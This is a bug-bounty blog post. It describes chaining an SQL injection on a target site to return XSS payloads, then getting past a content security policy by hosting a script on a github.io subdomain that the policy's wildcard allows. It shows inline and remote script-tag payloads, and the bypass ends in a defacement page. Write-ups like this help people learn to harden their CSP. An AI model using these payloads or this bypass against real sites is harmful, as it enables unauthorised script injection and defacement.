---
title: "leveraging the SQL Injection to Execute the XSS by Evading CSP"
date: 2022-07-12T00:00:00+05:45
# post image
image: "images/blog/CSP-bypass/1st.png"
# author
author: "Nirmal Dahal"
# post type (regular/featured)
type: "regular"
# meta description
description: "If you are unfamiliar with CSP, you should know more about it before reading further. The security header known as CSP, or content security policy, is the rules that help enhance security of the web applications against well-known security flaws like clickjacking, cross-site scripting, referrer leakage attacks and so on. As required by secure design architecture your policy should have directives like default-src and script-src."
# post draft
draft: false
---

Although it sounds silly, I am dumb enough to do this.

## Introduction to content security policy (CSP)

If you are unfamiliar with CSP, you should know more about it before reading further. The security header known as CSP, or content security policy, is the rules that help enhance security of the web applications against well-known security flaws like clickjacking, cross-site scripting, referrer leakage attacks and so on. As required by secure design architecture your policy should have directives like default-src and script-src.

But occasionally, a misconfiguration can result in CSP bypass. One of the best resources to learn about CSP header is as below:

> [https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## Let’s get started

So, as I was scanning one of the scopes for vulnerabilities, a CSP policy that had been put in place caught my attention. Since CSP had been implemented and CSP policy was attempting to prevent XSS attacks, I decided not to waste my time into it any more and instead looked for another vulnerability. Fortunately, I discovered SQL injection, and was able to dump the site’s database. However, my inner daemon was never satisfied with the SQL injection findings and always wanted to execute XSS via evading the CSP.

> But why on earth would you exploit CSP to obtain a single popup when you have already exploited of more critical vulnerabilities?

Because it’s fun to bypass security precautions but no input fields or parameters were XSS-vulnerable. So, I took leverage of a already found SQL injection vulnerability and created a SQLi payload that would return HTML as a response and includes an XSS payload. The SQLi payload had the following XSS payload types:

```html
    Inline Script : <script>alert()</script>
    Remote Script : <script src="https://anything.redact.com/index.js">
```
{{< image src="/images/blog/CSP-bypass/2nd.png" position="center" >}}
However above payloads failed to execute due to CSP policy and was unable to fetch my JS script in order to execute XSS based defacement page as well. So, I took another look at the CSP policy and found a loophole that would allow me to execute XSS. Next Time, I created a SQLi payload that would return the following XSS payload as an HTML response.

```html
    <script src="https://thenittam.github.io/index.js">
```
{{< image src="/images/blog/CSP-bypass/3rd.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >}}

>  I encounter successful defacement page based on XSS. But how in the world did it function with a different URL and the same payload?

Let’s analyze the image below to understand how a successful XSS attack was carried out by evading CSP by leveraging SQL injection.

{{< image src="/images/blog/CSP-bypass/4th.png" position="center" >}}
Above CSP policy were allowing the web application to receive resources from "\*.github.io”, and * means wildcard, meaning any subdomain of the domain github.io is eligible to provide necessary content to the target site. I could not upload my malicious JS scripts to any other whitelisted domains expect the above mentioned one "\*.github.io”. So, I immediately logon to my github account and created "thenittam.github.io” and hosted my XSS payload on "[https://github.com/TheNittam/thenittam.github.io/index.js](https://github.com/TheNittam/thenittam.github.io/index.js)" and this is how the successful bypass of CSP executed by chaining with the SQL injection.

*Note: They had implemented CSP policy to prevent potential XSS attacks that might occur due to XSS vulnerable code. However, it was my responsibility to find every possible vulnerability, so I did this stupidity.*

Thanks for reading :)
